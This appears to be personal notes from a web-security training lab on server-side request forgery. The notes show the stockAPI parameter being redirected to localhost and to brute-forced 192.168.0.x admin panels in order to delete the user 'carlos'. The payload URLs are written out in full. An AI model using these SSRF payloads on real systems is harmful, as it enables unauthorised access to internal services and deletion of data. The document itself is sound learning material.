# SSRF

api=[http://localhost/admin](http://localhost/admin) 127.0.0.1 [http://192.168.0.1-255:8080/admin](http://192.168.0.1-255:8080/admin)

attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. In other cases, they may be able to force the server to connect to arbitrary external systems.third party server connect

## SSRF against local server

i change the api to \localhost\admin [=%2F according to the format] actually no need change also can

<img width="593" height="454" alt="image" src="https://github.com/user-attachments/assets/4e3992c0-074e-44a7-b6c1-74efa8cfe042" />

we saw admin panel pop up since it retrieve the admin ui to us
we can delete the user lets delete carlos
when we burpsuite intercept and press delete carlos we saw

GET /admin/delete?username=carlos HTTP/2

<img width="727" height="434" alt="image" src="https://github.com/user-attachments/assets/a066bf96-d444-46e3-95a1-7d693d1ac07c" />

then we change the api to [http://localhost/admin/delete?username=carlos](http://localhost/admin/delete?username=carlos) we delete successfully

<img width="630" height="431" alt="image" src="https://github.com/user-attachments/assets/0a374e19-a739-4378-91c3-1cef5cef21f7" />

## SSRF against other backend-system

normally using //localhost //127.0.0.1 now using private address //192...
in this case it is [http://192.168.0.1:8080/admin](http://192.168.0.1:8080/admin)

<img width="704" height="196" alt="image" src="https://github.com/user-attachments/assets/243497c8-e148-4501-8d89-b843a801bcc9" />

basically same but just bruteforce the 19.168.0.1 -255 /admin until status code is 200 then delete again
we found that .166 is the correct private address

<img width="739" height="759" alt="image" src="https://github.com/user-attachments/assets/d105d48c-f8fe-4528-8bf1-04be3f36bc0f" />

we can see the [http://192.168.0.166:8080/admin/delete?username=carlos](http://192.168.0.166:8080/admin/delete?username=carlos)

<img width="657" height="577" alt="image" src="https://github.com/user-attachments/assets/fe26a305-34f9-4e15-be21-6f40105141e3" />

so we replace the stockAPI to this and forward and boom done

<img width="590" height="333" alt="image" src="https://github.com/user-attachments/assets/5739c532-dfc7-4d93-b488-e2c088dbe8ad" />
